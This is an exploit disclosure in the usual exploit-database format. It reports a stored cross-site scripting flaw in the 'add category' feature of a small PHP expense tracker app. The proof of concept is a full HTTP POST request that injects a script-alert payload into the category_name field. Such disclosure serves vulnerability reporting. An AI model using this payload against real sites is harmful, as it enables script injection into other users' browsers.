# Simple expense tracker app

# Exploit Title:
XSS  Stored  (Expense Tracker App Using PHP with Source Code)
# Date:
23/09/2023
# Exploit Author:

Xcode0x (Mohamed Almarri)

Twitter: @xcode0x

# Vendor Homepage:
[https://www.sourcecodester.com/users/remyandrade]()
# Software Link:
https://www.sourcecodester.com/php/16794/simple-expense-tracker-app-using-php-source-code.html
# Version:
v1
# Tested on:
debian

----
# XSS Stored :

Expense Tracker App v1 is vulnerable to Cross Site Scripting (XSS) via add category .

# POC [debian]:

1- add  category 

2- in category_name put your payload 

POST /simple-expense-tracker-app/endpoint/add_category.php HTTP/1.1

Host:  localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://localhost/simple-expense-tracker-app/

Content-Type: application/x-www-form-urlencoded

Content-Length: 84

Origin: http://localhost

Connection: close

Upgrade-Insecure-Requests: 1



tbl_expense_category_id=&category_name=<script>alert('By:Xcode0x')</script>&category_budget=1

![Drag Racing](https://github.com/xcodeOn1/XSS-Stored-Expense-Tracker-App/blob/main/xss_stored.png)


 # Tested  

 Linux - debian
